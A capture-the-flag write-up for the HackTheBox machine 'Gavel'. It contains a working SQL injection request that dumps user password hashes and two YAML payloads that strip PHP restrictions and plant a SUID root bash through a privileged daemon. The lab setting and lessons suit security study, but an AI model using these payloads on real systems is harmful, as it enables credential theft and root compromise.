Gavel

HackTheBox Writeup

Box Name: Gavel

Difficulty: Medium

OS: Linux

Date Completed: January 2026

IP Address: 10.129.x.x

Summary

Gavel is a Linux machine featuring a vulnerable web auction application. Initial access is gained through an exposed Git repository revealing SQL injection and PHP code injection vulnerabilities. Privilege escalation involves exploiting a custom daemon that executes YAML-submitted PHP code as root, requiring a two-stage attack to bypass security restrictions.

Source Code Analysis

Vulnerability #1: Database Credentials

File: includes/config.php

define('DB_HOST', 'localhost');
define('DB_NAME', 'gavel');
define('DB_USER', 'gavel');
define('DB_PASS', 'gavel');
After attempting to connect to the DB using mySQL I get a connection failed. It seems like the DB is protected. Moving on to other attack vectors.

Vulnerability #2: SQL Injection

File: inventory.php

$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$col = "`" . str_replace("`", "", $sortItem) . "`";
...
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");

The $col variable is directly interpolated into the query string, creating a SQL injection vulnerability through both sort and user_id parameters despite using prepared statements.

Vulnerability #3: PHP Code Injection

File: includes/bid_handler.php

runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);

The $rule from the database is directly used as the function body with zero sanitization.

Exploitation

Exploiting SQL Injection

The SQLi requires a combined attack on both user_id and sort parameters:

GET /inventory.php?user_id=x`%20FROM%20(SELECT%20group_concat(username,0x3a,password)%20AS%20`'x`%20FROM%20users)y;--%20-&sort=\?;--%20-%00 HTTP/1.1
Host: gavel.htb
Cookie: gavel_session=YOUR_SESSION_COOKIE

Technical Details:

  • \? - Backslash breaks PDO's parameter detection
  • 'x - Single quote in the alias is critical for query structure
  • %00 - Null byte causes string truncation at C level in MySQL driver

Two-Stage Exploitation

The gaveld daemon processes YAML submissions and executes the rule field as PHP code with root privileges. However, PHP restrictions prevent direct exploitation.

Strategy:

  1. First submission: Disable PHP security restrictions
  2. Second submission: Create SUID bash binary

Stage 1: Disable PHP Restrictions

Create malicious YAML:

cat > /tmp/stage1.yaml << 'EOF'
---
name: "Config Bypass"
description: "Disable PHP security restrictions"
image: "test.png"
price: 10000
rule_msg: "Bypass attempt"
rule: "file_put_contents('/opt/gavel/.config/php/php.ini', 'engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n'); return true;"
EOF

Submit via gavel-util:

gavel-util submit /tmp/stage1.yaml

This overwrites the PHP configuration, removing open_basedir and disable_functions restrictions.

Stage 2: Create SUID Bash

Create second payload:

cat > /tmp/stage2.yaml << 'EOF'
---
name: "SUID Bash"
description: "Create root shell"
image: "test.png"
price: 10000
rule_msg: "Root shell"
rule: "copy('/bin/bash', '/opt/gavel/.config/rootbash'); chmod('/opt/gavel/.config/rootbash', 04755); return true;"
EOF

Submit:

gavel-util submit /tmp/stage2.yaml

This creates a SUID copy of bash at /opt/gavel/.config/rootbash

Lessons Learned

  • Exposed version control systems reveal entire application internals
  • Complex SQL injection can bypass parameter binding when column names are dynamically constructed
  • Dynamic code execution is extremely dangerous with elevated privileges
  • Configuration files should never be writable by unprivileged processes
  • Multi-stage attacks can systematically bypass security restrictions
  • Defense in depth is essential
